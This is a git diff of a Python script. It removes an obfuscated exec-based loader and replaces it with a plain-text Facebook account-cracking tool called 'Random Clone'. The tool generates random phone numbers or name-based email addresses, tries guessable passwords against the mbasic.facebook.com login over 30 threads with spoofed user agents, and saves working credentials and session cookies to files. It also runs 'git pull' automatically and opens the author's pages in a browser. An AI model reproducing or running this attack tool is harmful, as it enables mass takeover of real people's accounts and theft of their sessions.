@@ -1,5 +1,248 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Sat Mar  4 21:05:20 2023
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'=IJZU3XRHQ773XO4ZPVSJ5BO7Q6GTCUJCIQ24INCFJ3Z3QYYE7P3LOW4BQVLORC6HSZTAD2KFYVWJOOFV6RO44WOXCYTNHLO4MWIXXMARNBPL4MLGAH76QLX5OVNEHQQ3Z3F47CYM5PG523OGVF5OEKI24TRXSOLFQ5PPVAW4ZD3I5CLDCJQDJNAWPFLYJ36DA4ZFAQRGL3HA7NRV3MMDNPH5Y75XLK65Z6FGRQF7F26HLBMLQXSENEQ2MOYNB7O2XJWE44WCJHLTIY5BHXDCBZDY6AZQK2K2OIBMCYA5R5NUUXN62P26TTTMCQH3QEXXKDDKH77QFICLVGYFPI3WQJAXHY7FNLJE2YIGJ32G2AHXHWHDWFXYIFOPJ56UGQ7UFE2U5FGVDN6JPMHOSX37IXR6V5PX4HXD77W5RN7JXC7VFSIAMMJN7CWDI23A3ZH5A7VSMGVNSAPAMPOG2XBJAEUA3ABGBO6OYCI46MXRTYRBTENXWTVJTTAY7APHP5KV5QEVIEHCTQMG4WKQOMYQB62FEQ3GAMLEMHKN5EYLRZ4YJSIJJDPSY2WTKSDI5Q5R42VTZJRTIMY4ANVTUVKPGU53EBQWNEI3PQDQB4UHECMCCFK6Q5PDGPW7YNFFY74C6PM6A45GSIH7N3QS6KNOPO737BOPNM7W365PM5PBFC4NDZT43DTRWXIATP6RXP6G3YAMWFGFPBQCCY3E4XAO2PLUZG3Z53DTFPLYA7H36GJSY2EQEN62AFIS66UZWZIWHXN7PJVVR5RUBHFCTTJ7XJOTQUCQQGAO536DWCLE4HVC6BLZYQIQX2R4OBEASS63YPOFUZSJZMFCS2AHQUW3S2MBKH6OQGJPEDMWCUKWJRWAEM4M4LY3KH26UPJDO4YIXOSKXENSVUPQEW4CJBJPPDICHWKUGEDN3T2SXLDBGGHA5I4ITGKJT7SQPV3U3RL34APWOOY5AEVCBMGBIVHTKHMAQ22AXMOBL7SS35T2EQ67USPFCVLYYB43SL53BNHS6EVD4IMMTJPWY3PR2N4FWNLGAX4CVBLY3YGK2QB7Y3KGOYR3TXJQMTPGA6ORGHLOMBYWJXDB2DYU7K4QUOXAZWAE5ASZTS6AMV3ULVF4DQHDX7LSUC4YJEZGXVKZKGW5KL3RFZIAY7REN4EPYCPWLQZOYQQAUFNTUAJQPSZMQ5LI5UXWBXASTED6HVHSD56FEYIHSORGAH3X4JGGAVPRESAR24YWPEIUZJ6NFN7VCE7NBZF5IQEIE432BJY34WRWTOGLLODVN4UFQEHGHJAT3LAYIFKB2VBY7T4MEFAMYRZ3UXXDVZCSWJXUWT5JBWGNEGLA5KYXBDOJXCBT2BHNYE6F5ASIUDVHX2Z26VUABFLVRY6HAGQO7CJ6P4C2WKRD4YI3HWTPOZ74WA76FUL2Z2NCWJBS5Y4JENSOQYU6CXYRKWBWIQGSECWAIOCWH5MSEL3J2D5VRYC52JHN7L7EBZ6MOFITZGZ6SSAU6PYBHMWOHC6IG4DGKD6XF5CQLDB2E2VOWTYG4ILQNIMWAUYMVKMCQPM3AJAAZBTU6PDQCWBU6J5BI7K5IZDOM3GDZFAOC3R7VKZPZV75QTE7IW6OOZWFWHMT4FIQB32KZOVUBDCACYAZXMEODEB5R3Y4MPXUNRFBIVDHZNXM4YJU2TRJEDIQ7PAARRBMSHCNMFR363Z6LEQA7OCY5RJUKM3UDBFH55754AWYYZ7VOALA2G724FAYTTUV46MDQJZWEPA5KGBMMCTSTFJRUAN6IYLNOAQY3UYMMMWPHQOR6J5THQVRHTIEXF36R225LEBCHZINLSVQUHV4Z63X2GFOP5ASYHUWJ6SRLCION4NK25MJIRE4Y2LAXMNQ47XVW3IEAKQVYCBZKDJPBEFCEDSQI3PQRMVA2ANUGFKG6O5W7ZW7L2FQFGTRCLUJPR63IAYNXWMMIRQPX4JXSEPSLTTYMDTI5WWVHV5ODKDRNG5WQR5HKAMXKF3MRLNAUCSYJBMN6SQNDAL3AMXMC4W3CWBG4I6OQEIEDJGJYJQW3QKYMM7EGLBOAPOBEGMOOQ5Q6XDIJFAXWM54JCZPK3BRQCSCKCISO6AETE425EADA5OVG3YGGZJVCYRJ7XRNV7KLT7TQ3FKUPUOYQEK4LHM2SNJYCVQCG34CONVOKYAG35PLCVD7BQWMU3VJZ4VK2U7BU2G6WYLZHYXIMLOYVKMDSSMWNDARYBFT5ZNHERN2VFAMNDYNOXQUMMPGLOHDM3LKKBYQVFFBKFKEAK3AGM3WHBM6IFRGKNY4T4QUIFVQYBSUEUOALMCHWPK3EBMATJXXWB2ZY3QEI7QNTTYLOAZBZ4XEN62WNAQIW3XSNHUC6LTJJGZKZLY5ZSF3AKVOKYUH6CVSUQFK66TMG62KSUUT54RC7Y3XXFXQU6AHVUON7LMSOIA6S3XABI4FCESNCSUHBADT32O26PVEX5V3QRM7HT56QF3QJY333ACXNXP57XQLYTVZSQ46F46IDSTJBIGPPLQWB7OX7AB44FZ3DRSTZ3HSBDKL5X5QM5JP5BD4V5MDZ24I4EPCM5SUOZU3EC545QCU2Z3KHWKQWDGARLWHQANHYKWTP6HKKT7KGC6IFSPZO3ANAFTIF2Z4HTNKZIKL6KMUXEAJS6OAUIK4TJAYIK2NQJR5YTMFIF65YUKI7HAEBNL2P6Q6YGAE63AKAWOXWH5VCBJAGGJLUHVSHWLWLXR3T4L4TMBPOEFGCJJRZVT4BLOHLK4KTJCJO64WMOWUMGEDEYXPVBQR3BIPRXS5CK3H7LX43VDOXWEQX3NKUNBYRM3YY6VSSIUDA2WKJSFZDDCYZT7ROKJMA33AN4U2FRD7FI4JKVT2IP7G2NRHAOKITH2FM5TUSESNPIX3SUISFWUA3OBFGT6ESB2GS5YAEUFZHAUKIVA5GA67KMXY3N5N6S73B6Y7YHH7DIVIGBZOVRSGM72YXYAPLXX66D76CC4R7VWYCIM47VBQHHYMLL7DAD5BCNBEAVFKBI3S3G7UUXV33OB7OPL4RK7TIL6AP736Z73B5QXRJAGDMLHHTVBRLJSOUBKIAZAOY36LQHXB5BPNZHWJZHJLNEICEHV75C6GE4LCUPDKCZ4CBKCWBNW7LVV7SURVRP5QQK7RBB45XPLRUWORJCCX75HEUMETPFUPOE724A5IA7F4UZQM6SHTNYZH25FX47SZQCVASN2RAGOZ3GO2XX3MH7HHAEM335UWTHMX6B7G66D7NAQPSGJIMUBKURP5TCQPZOHW5GDF2RCE4Y2DQIXVBDLL53PLY5OXK7Y6A33MQI2IZDTYI3BE6OF4NUFQD4EWHRV3WYKSLJDA6PR2RKWGAXDBRFSWJUKTZBUWX3UQBPA4IMPKRRRYWYSMAQ2EUPQA4NCWXLVMNEEAJIJCZ6NQ3RZ5LPJURFDFH5M24P542CMDMJGUIYODMTGLC2XXSX4BXMB2CU4BA5U5AOBLKJRLIOMW7WLPWOJRKZ6KORFV4E3YLPWW4TERI2OLQMDEZY5ORNJFZODO4KSJVGJ5AT7BGF3D76HEBFAPLQBNF2WLY45374AQ63544WDH3AA6HX3MWVBKGTVSQA4ZGQFFHA3B7BSB5Z74ZRB3DR4JFILO32EG2YQAA3POUAUQDILWSWF4SQEWNNXO6E454NS5OYBHCRUK76PKJB3JAG7Y65RRL5P5ZGTDQI2H36MS2XBC7H44CJIMZSXSXITWVLAWUM7T5FKDY65EJ7M3G37B5BQVCQEEF4YQU2C7K3UBCBAWYZGLDHIHR7I3OBAEZGLNKNNP4TXDZW7P6LIF7AARVEBSGCMKGCKIEMQFY5OCDXAP5UR5VNAXB6SIGZ7VZMXA42FZGSROR57QYZQEEL23VPA66NDNSYG3F33L6N23LLQVLMDXZWR57OESO7H42SJIVGKLUGQPFBBSF4NCAHDLWPBLYIMMQIL6FGRJDIG6SNJOLUEPFZCR2EE6YAPRXPKVBAI67DTCY3HIIYOTYP626IMLKVVOIPXREWJIJOSYSKXFREGSBVCE3Q33T3THQQTMCBSLQBY3NWZLN4PUFMUTVMHWLCRPRK7Y2UN3DWRSOUO63UFRCAI73WXVSCWAU46TAXQR4PHE2OCRSQTMHGCMF3FC4UWSYOR2EWHJSBKOFJTBJLBRMHKPHTXRNUYIGP2H55L2ZLDTVRDEPCMGN47HV2V63D42SQAVZYEMWIX5JSITGQ5YOY2GNCYPKB4LCQ7OTSRMLCS37B2V7SD676U6PCPYFS3HNF62BTIDZVL33PNKAVJQIY5QRAHXLJHTSX2OAZVP4VBVMMKOA25FUJGL2R2J6CKAUWG56T3TFNA4AOB2RTDRDMOXIAM74ON5EFHTMGASX4KBECKQUD53G6QMBGQYXBTY6ZUAUQGQ2N7BWNQNO5VQGOV23XY3VGVKL4CWL77DBHCXLFRGPVLN3IPRCZKVZG5CEXFB4XMSDWE7462XLZOPGOMQWT4GIW4VHHR7LBNANJWDWLVSHSHW2A3DX34L3TPHGSWLMF55GK7OIY4FD5WDRNY7GB2S6C52ISCY7GMH5LW4E6GZ6AXFNJYOMGD25TXQ4BO25WMTIVEEWE57YO6EUCMNOFB5IZLNYO5LPXCWNWIZLBQPM7MHXA2CNV3NX6MKOVPES4PJNQSV2BLE54O2UPCYMIL5DHAZNYP4D5H4EASZYQ46OIQAUXLPTSUOWXO6QVCZQ6QG3I6AN5DSWAGA3XEFPDHWNCOBRK7PS7EJQBCROZ2LOBW6Y2SPQREHCK63QSJ3ILJOJHTHNWWCTK3DAL5RL2SNJB6WYAMWCZHEXYWLM6LYSVFLF72GD2XFG7AUSHFP4S5UKOJZTTYHGP522F2AWGP2QRGKNT5N5EBFAAYTXKJH2QUQJEPWWSIGX76UGK7VO6YIUMWANPUD7HKFIXII5KZFUVJ5GFWIB7TWP4MQYBXCJTLDEAZHRCXK6A2HZOVX2UZYIUVFHVSBTGQ4JBOELZPJJ462T5545UGAVRWWJLNMVFEBLA2ZAE7YDDGXLTCO6GDYERAOE6T5RG4YBH6VFU4TDPWTB2L4IBP22O6MVMOGFRNEMHN5OUU43UUMNGYT4V3KKAMQYGS4MXZHO57SRP363W75W6DB42X3DJ3QTVF634JSA7Z5AS4MKCTKD5WEWECIQ7N6N7RTZKVUYFM52DQQYARAG3CCK5T5HGGLUXJZXZWUR7M66P63TSDPNCR66S4JBCEZZDIEJ6EBEPYGBX2QKVM2NVJ3ZIFOH2QXFINKDDUWRQ7PN2JFAWH6TPVZRCM4LDIVFR7H5ZAWJM3AQLKQETODRJH4PGFKLCPKG4K6URZJ4ILF5PAA7JF7M7MOQZT3XFFL3DNZNWZAQAV2GRW6TJW4NNFBSIDMBMTMFKRJM3RAFNSJYGUTQDLLE6AXRDRQFS4ZS5TTAWPUMXJ7UGBMJJLJBFBTOXLYRXQBYQVL5PNILHANFDGW7WDGB7DK7N2V25LLFMTPTEHTMPN7Z5NEI5U3KEMN4EZ5UZB2NS5ZSCB2G6QI65VI433IKIHXHIHBVVXIZXWRIPGSKJ5S7FGYABQLBQZ3RO7EBC6Q5SID3W4MXCVZVRPH2KSDR3FXXKQLH5IOXIJLSYH3PMNW5KNYCC4CXBOZS5Z4N4YMNWEPGDU2WVE4KK36B3R6OE5U7KY4N5T73GJFGXOVVKMFXKXNI7YK36GDVPLUOJV62TXSAVUT4MYPQY547XPUQWODD2K4FYCYA5DN3HKPMA4OZ5BRPCLSQJGXZO2NBVL5XLEOXGSJ6FHMSW3QDVWEEM2UP7FXR66S44ZXC2GM7TYU6YZUBIXPIIL7GBDAQXY2YGVTCSPOYLI2XHIZEYLE4PG3RC4KWPGCRK6WZA3RPPKQZPRXVBF6KYVGQLZORP3HWNOPP265GWGXCWGORBIPCH4WBA6Y4Z5X7LAGFHRGTB2AQ44DQOVURQXGQCSPRYDRZ2YSPVKD7KNGZ4I6NDJQQZOJURQ757D3YNHQAZZMTWXFN4NV4N3DHNEWTGR7HSUYKEQ6PXH2V3L37CZDOBYXA4EN5FBBJDVU3UX5TSLXNMJR7Q2BBLORHLL3QNNOIKQLD42GOFZ37IMNOAVRGRGLH72PTGICDO6DXND3IPRL2RQA4LHVUZGUPMQBQOVKO33B4KGTHBDLWQ65IHCSJ7QW5RIK3LWGUHROJAAU5UZI2YDNT6CM5T43UEGMAHEBS5TT2TNQENEVWKD2AGXBD27EUSMLCGZZPVVE4GUN2PV54VPCAC522WFAOTMHKBHRVYR2RJX3Q2KT5XVYL7PU3HTCXSFBKL3W53UWKKR4PQ3ZVX3WZVNT26DZQTOA5256S56RLJ34GJV5WPBPFXXYUNNEE7NGVJWQMGE6ONJXMS5EHO76FCSYPHH7KPPO5PYGG4GCBG5UB24DYC2BFCEY2P2QQKNR7WXW2FJJVSPPHTBSUL5IPA74GPA7SD2GUL2ITFOXIXC3YQYMNPGLFB22WSFEUDTUJR5F7TEV32Y44KQTDLE7VBXLSY257EOO5VYTHGVYCQRYOLS2OWVDTAV6CEP7LNS4S7OOHOJUAVY3UIV3MD7M65EVQRW72SNKEEIBIFKWJ7IMCVAJQXWNJL7SLOLYKL3KR5HV3KGUBS44LW6JGCLNWY3RKQSGRS476CDPIVP3T6HR4AWND34ZG4SM3FZF4P26BD7BL42OPLROU4IKPZCRVD7A7QZPK2FYSHN26OT6EESITO32P4W6QCFBOQKPMLF3EZIV44L7YG5JOMFR3QL2KK6HSX6LZ6XY2DT5VYQZH6HEYSUPHRR6M62HSFC34OF3NWQO67ULBDQNPIFJ7B564LKMWXUVXFWMQP3VGW2PKX3HOTPOMVVD5OQ4RRGM4GZKOVBR5OSYM32DX4N766MT23HICMXE5SM6GPQTHO3KIT67UGDM3KZO3LUKKXX7WDNNJ6PFUYZX5QNYEBEDC6SDGU3ZX6XD2I6BL2XDLSYMRS3KRY55K6PRJ5OHJKX2IHYFLAWHDV63TC36I5HLLVIVBXYKX4TDDX55GB4CIAOWOEUVV5UHMEZ4PVUFMSN5R7FBAOTS4TGS4X54QQ3MBKMGNF6PFWEGPEU24BSLUD5ZSSYH5LSK3ZQVKLM6JTYNTDOCVOGETAUYZT7BZOZRTQYK6JPVYD5UT7URBHQYETNWOXQ4V27OVMX2OYHVCD4SPPWTND3VNB3GKMM7B7XZO6VXZEAU3BTNPMK27ATWICYUMU3OS3OV77OATGE5MYXIONHMD5GZSQCV2AKNSZMEJNEJKBRHFVB3C2PPJMTHCSQX2JF5XVWQOJ342VIR4HHX234PLKUZ3KJRDJYLTOBPJCS7IGBBUKWWIP7WORXE7ZNCTP5Z23D3VR76SXNK7CDYEXXK25JJZPHXXNW7SCK3M2BIJ2XOWZ2PSGUKYJ464MFSQHQV5JFFPSCHSL46SNTF3AXWMDTS4CSMDPVMS5PVBJNMHCP2COWPCJ2VH2YJ7OLM5LTVU2PICI73NFPHJMT7HWOQMJ3FNWIEGRPMZNSQYLZBFEEYY5HNKCITMOKJNSSGE23Y52VCBCRHVPJ3A6NLPASMO4FXI5TEEO36YH7VXVRNRSQHDWNZXEZSH7Y32R6EWJZK6VSKPSWRWY4TQDHXFOHVV6APJG52TR7N2EXU3TWVDOOUIWMR4MN4GVRXRGFU745KVECZ3XTKXK7QFKHEFYXSDPN2U4YWYKZ7753TX67776ZTP677745Z77X2XETPA4LUFKXDVKF77TP4LHANWLENUJBSJEGAQANQCU4R3CTWR4REKFMLCLSJKG3BOCP'))
+#............ASIF
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+os.system('xdg-open https://github.com/Asif-404-CYBER')
+logo = ("""
+
+ __   _______      _    ____ ___ _____ 
+ \ \ / /_   _|    / \  / ___|_ _|  ___|
+  \ V /  | |     / _ \ \___ \| || |_   
+   | |   | |    / ___ \ ___) | ||  _|  
+   |_|   |_|   /_/   \_\____/___|_|    
+                                       
+
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mASIF                       ┃
+ ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
+ ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
+ ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
+ ┃ [✓] GITHUB    \033[1;91m: \033[1;92mAsif950                    ┃
+ ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mASIF                       ┃
+ ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801302400111             ┃
+ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
+
+class Main:
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system("clear")
+        print(logo)
+        print(" [01] Random Number Clone")
+        print(" [02] Random Email Clone ")
+        print(" [00] Exit")
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        Asif =input(" [?] Choose : ")
+        os.system('xdg-open https://facebook.com/groups/termuxteambd/')
+        if Asif in ["1", "01"]:
+            num()
+        if Asif in ["2","02"]:
+            gml()
+        if Asif in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+def num():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    kode = input(' [?] Enter sim code: ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input(' [?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
+        print(' \033[1;97m[+] Process has been started')
+        print(' \033[1;97m[!] Wait for ids ')
+        print(' \033[1;97m[!] Use flight mode for speed up ')
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
+
+def gml():
+    user=[]
+    os.system('clear')
+    print(logo)
+    kode = input(' [?] Target fast name : ')
+    os.system('clear')
+    print(logo)
+    kodex = input(' [?] Target last name :  ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    doamin = input(' [?] Terget doamin : ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input('[?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
+        print(' \033[1;97m[+] Process has been started')
+        print(' \033[1;97m[!] Wait for ids ')
+        print(' \033[1;97m[!] Use flight mode for speed up ')
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+guru+doamin
+            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
+def rcrack1(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r[\033[1;92mAsif\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[38;5;46m[Asif-OK] {uid} | {ps}")
+                print(f" Cookie : {coki}")
+                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\x1b[38;5;196m[Asif-CP] {cid}|{ps}")
+                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\033[m[Asif] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+Main()
